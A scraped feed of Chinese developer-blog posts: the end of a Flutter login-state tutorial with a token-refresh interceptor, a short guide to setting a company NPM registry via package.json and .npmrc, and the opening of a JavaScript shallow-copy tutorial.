<p>接口返回 401 时，可先尝试用 refreshToken 刷新 token，失败再登出：</p>
<p>dart</p>
<pre><code class="hljs language-dart" lang="dart">onError: (error, handler) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">if</span> (error.response?.statusCode == <span class="hljs-number">401</span>) {
    <span class="hljs-comment">// 1. 获取 refreshToken</span>
    <span class="hljs-keyword">final</span> refreshToken = <span class="hljs-keyword">await</span> storage.read(key: <span class="hljs-string">'refreshToken'</span>);
    <span class="hljs-keyword">if</span> (refreshToken == <span class="hljs-keyword">null</span>) {
      <span class="hljs-comment">// 无 refreshToken → 登出</span>
      <span class="hljs-keyword">await</span> authProvider.logout();
      <span class="hljs-keyword">return</span> handler.reject(error);
    }

    <span class="hljs-comment">// 2. 调用刷新 token 接口</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> res = <span class="hljs-keyword">await</span> _dio.post(<span class="hljs-string">'/refreshToken'</span>, data: {<span class="hljs-string">'refreshToken'</span>: refreshToken});
      <span class="hljs-keyword">final</span> newToken = res.data[<span class="hljs-string">'token'</span>];
      <span class="hljs-comment">// 3. 存储新 token</span>
      <span class="hljs-keyword">await</span> storage.write(key: <span class="hljs-string">'token'</span>, value: newToken);
      <span class="hljs-comment">// 4. 重新发起原请求</span>
      <span class="hljs-keyword">final</span> options = error.requestOptions;
      options.headers[<span class="hljs-string">'Authorization'</span>] = <span class="hljs-string">'Bearer <span class="hljs-subst">$newToken</span>'</span>;
      <span class="hljs-keyword">final</span> retryRes = <span class="hljs-keyword">await</span> _dio.request(
        options.path,
        options: options,
      );
      <span class="hljs-keyword">return</span> handler.resolve(retryRes);
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 刷新失败 → 登出</span>
      <span class="hljs-keyword">await</span> authProvider.logout();
      <span class="hljs-keyword">return</span> handler.reject(error);
    }
  }
  <span class="hljs-keyword">return</span> handler.next(error);
}
</code></pre>
<h4 data-id="heading-16">4. 启动页判断登录状态</h4>
<p>Splash 页初始化时，根据登录状态决定跳转到首页 / 登录页：</p>
<p>dart</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SplashPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  const <span class="hljs-type">SplashPage</span>({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">State</span>&lt;<span class="hljs-type">SplashPage</span>&gt; createState() =&gt; _SplashPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SplashPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State&lt;SplashPage&gt;</span> </span>{
  <span class="hljs-meta">@override</span>
  void initState() {
    <span class="hljs-keyword">super</span>.initState();
    _checkAuth();
  }

  <span class="hljs-type">Future</span>&lt;void&gt; _checkAuth() async {
    await <span class="hljs-type">Future</span>.delayed(const <span class="hljs-type">Duration</span>(seconds: <span class="hljs-number">2</span>)); <span class="hljs-comment">// 模拟启动页延迟</span>
    <span class="hljs-keyword">final</span> authProvider = <span class="hljs-type">Provider</span>.of&lt;<span class="hljs-type">AuthProvider</span>&gt;(context, listen: <span class="hljs-literal">false</span>);
    <span class="hljs-keyword">if</span> (authProvider.isLogin) {
      <span class="hljs-type">Navigator</span>.pushReplacementNamed(context, <span class="hljs-type">AppRoutes</span>.home);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-type">Navigator</span>.pushReplacementNamed(context, <span class="hljs-type">AppRoutes</span>.login);
    }
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">return</span> const <span class="hljs-type">Scaffold</span>(
      body: <span class="hljs-type">Center</span>(child: <span class="hljs-type">Text</span>('启动中...')),
    );
  }
}
</code></pre>
<h3 data-id="heading-17">四、核心总结</h3>
<ol>
<li><strong>状态持久化</strong>：用 <code>SharedPreferences</code>/<code>flutter_secure_storage</code> 存 token，APP 启动时初始化；</li>
<li><strong>全局状态</strong>：用 Provider/GetX/Bloc 管理登录状态，所有页面实时感知；</li>
<li><strong>路由拦截</strong>：自定义 <code>onGenerateRoute</code>，拦截需要登录的页面，未登录则跳转登录页；</li>
<li><strong>接口鉴权</strong>：统一封装网络请求，自动携带 token，处理 401 失效逻辑；</li>
<li><strong>登出逻辑</strong>：清除本地凭证 + 重置状态 + 跳转登录页（清空路由栈）。</li>
</ol>
<p>这套方案覆盖了从「登录」到「权限控制」再到「登出」的全流程，适配大多数 Flutter 应用的权限管理需求，可根据项目复杂度（如多角色权限、动态路由）扩展。</p>
<p>分享</p>
<p>如何使用SharedPreferences保存用户登录凭证？</p>
<p>如何使用Provider管理登录状态？</p>
<p>如何自定义路由守卫？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何优雅的设置公司的NPM源]]></title>    <link>https://juejin.cn/post/7579849892614471716</link>    <guid>https://juejin.cn/post/7579849892614471716</guid>    <pubDate>2025-12-05T05:17:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614471716" data-draft-id="7579843977849356342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何优雅的设置公司的NPM源"/> <meta itemprop="keywords" content="前端,NPM"/> <meta itemprop="datePublished" content="2025-12-05T05:17:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="杨啸_新房客"/> <meta itemprop="url" content="https://juejin.cn/user/671180664355155"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何优雅的设置公司的NPM源
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/671180664355155/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    杨啸_新房客
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:17:10.000Z" title="Fri Dec 05 2025 05:17:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>避免公司源与官方源冲突，以及发布没必要的库到公司源。</p>
<p>这里的案例公司的发布地址与拉取地址不一样， 具体情况自行修改。</p>
<h3 data-id="heading-0">库修改</h3>
<p>在创建或现有库项目中，需要有进行两处修改：</p>
<p>1. package.json中添加要发布地址，代码如下：</p>
<pre><code class="hljs language-json" lang="json">  <span class="hljs-attr">"publishConfig"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"registry"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://nexus.op.xxxxxxxx.cn/repository/privarte-npm/"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>2. 根目录添加文件《.npmrc》，内容为：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">registry</span>=http://nexus.op.xxxxxxxx.cn/repository/goldnet-npm-group/
</code></pre>
<h3 data-id="heading-1">添加私有的NPM账户</h3>
<p>1. 添加指定源账户，这里是公司账户，一般要求用户名/密码/邮箱：user，password，<a href="https://link.juejin.cn?target=mailto%3Amail%40xxx.com" target="_blank" title="mailto:mail@xxx.com" ref="nofollow noopener noreferrer">mail@xxx.com</a>，命令行执行</p>
<pre><code class="hljs language-ini" lang="ini">npm <span class="hljs-attr">adduser--registry</span>=http://nexus.op.hang-xin.cn/repository/goldnet-npm/
</code></pre>
<h4 data-id="heading-2">发布库</h4>
<p>npm publish</p>
<p> </p>
<p>基于上述设置后，在库中的操作只针对配置文件中的源，不会污染全局设定了。 可以在不同的项目根目录执行<code>npm config list</code>看源地址是否设置成功</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[地址与地基：在 JavaScript 的堆栈迷宫里，重新理解“复制”的哲学]]></title>    <link>https://juejin.cn/post/7579892134817366051</link>    <guid>https://juejin.cn/post/7579892134817366051</guid>    <pubDate>2025-12-05T05:27:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892134817366051" data-draft-id="7579887768227217442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="地址与地基：在 JavaScript 的堆栈迷宫里，重新理解“复制”的哲学"/> <meta itemprop="keywords" content="JavaScript,前端,面试"/> <meta itemprop="datePublished" content="2025-12-05T05:27:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="漫天黄叶远飞"/> <meta itemprop="url" content="https://juejin.cn/user/2948205649344634"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            地址与地基：在 JavaScript 的堆栈迷宫里，重新理解“复制”的哲学
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2948205649344634/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    漫天黄叶远飞
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:27:50.000Z" title="Fri Dec 05 2025 05:27:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>
<span class="hljs-keyword">let</span> b = a
<span class="hljs-keyword">let</span> obj = {
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>
}
<span class="hljs-keyword">let</span> obj2 = obj
</code></pre>
<p>把 a 的值赋值给 b ，这个是一种拷贝，但是把 obj 的值赋给另一个对象 obj2 ，它就不是拷贝，这是为啥呢，今天我们来深入探讨 js 中的 <strong>拷贝</strong> --- 分为浅拷贝和深拷贝，由于原始类型在任何语言层面操作都是值复制，没有共享问题，也就没有“深浅”维度；所以在这里，拷贝只针对引用类型，基于原对象，拷贝得到一个新对象，这也解释了为什么上面对象赋值不算拷贝。</p>
<hr/>
<h2 data-id="heading-1">浅拷贝</h2>
<h3 data-id="heading-2">1、<code>[].slice(0)</code> ---截取数组</h3>
<p><code>[].slice(0)</code> 就是一种浅拷贝，我们来看看一下浅拷贝都有些什么特征</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}]    
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)
arr2.<span class="hljs-title function_">splice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);   
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be9bda81c3ca43d58da3ca82bc02f622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=easKNcc8O95DkTPfkJXf26ltJqg%3D" alt="c538c217-9814-4c79-9aae-6add2fa9d77a.png" loading="lazy"/><br/>
看输出结果，它符合基于原对象，拷贝得到一个新对象，新对象改动不影响旧对象，但是这样也解释不了为啥叫浅拷贝呀，别急，我们再来看一段代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}]
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)
arr[<span class="hljs-number">4</span>].<span class="hljs-property">age</span> = <span class="hljs-number">20</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/251c27c7a89b4c81bc13dba1b0937ae8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=IfkF9cYFm9KyIFQfr9tcRbB8N4k%3D" alt="78a83d3d-d1da-44f0-8d5c-e26a4afa842d.png" loading="lazy"/><br/>
我们可以看到，旧对象里面的子对象在拷贝过后改动会影响新对象里面的子对象，只是因为所有的引用类型都会在堆里放一个引用地址，我们拷贝时新对象里面的子对象是 copy 了一个引用地址，后续子对象里面的值更改过后，新对象也会跟着变，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e32e2c73eafe4933a9031ec9203974f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=vQYqsIK6%2FplsxbNTtODxTb2wL48%3D" alt="66c027236d7bb4c7a370e6650d915a55.png" loading="lazy"/><br/>
所以我们可以知道 <strong>浅拷贝</strong> --- 新对象受原对象的影响（只拷贝了原对象的第一层，里面的子对象拷贝的还是引用地址）。实现浅拷贝的方法有五种，分别是 <code>[].slice(0)</code> 、<code>[...arr]</code> 、 <code>arr1.concat(arr2)</code> 、 <code>arr.toReversed().reverse()</code>、 <code>Object.assign({}, obj)</code> 。</p>
<hr/>
<h3 data-id="heading-3">2、 <code>[...arr]</code> ---解构数组</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}]
<span class="hljs-keyword">let</span> c = [...a]
c.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)
a[<span class="hljs-number">2</span>].<span class="hljs-property">age</span> = <span class="hljs-number">19</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85b9541d575b497b8f1613705614cb13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=mPbu2M7%2BJC%2Bn6Somn5TnENaqt5w%3D" alt="744c2209-2f31-44b3-9979-652d8c15fb3e.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">3、 <code>arr1.concat(arr2)</code> --- 合并数组</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}]
<span class="hljs-keyword">const</span> b = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
<span class="hljs-keyword">const</span> c = a.<span class="hljs-title function_">concat</span>(b)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c, a);
<span class="hljs-keyword">const</span> d = [].<span class="hljs-title function_">concat</span>(a)
a[<span class="hljs-number">3</span>].<span class="hljs-property">age</span> = <span class="hljs-number">20</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3030de226ee0474480a4672f5823ab5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=Vn13FUV5xvsfTW%2F8met3nrotPx4%3D" alt="fedf2b92-d80f-4d51-a690-7fe491aaadcd.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">4、 <code>arr.toReversed().reverse()</code> --- 反转数组</h3>
<p><code>.toReversed()</code> 得到一个反转的新数组，<code>.reverse()</code>方法会反转原数组，配合起来就能实现浅拷贝：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}]
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">toReversed</span>().<span class="hljs-title function_">reverse</span>()
arr2.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)
arr[<span class="hljs-number">3</span>].<span class="hljs-property">age</span> = <span class="hljs-number">20</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);
</code></pre>
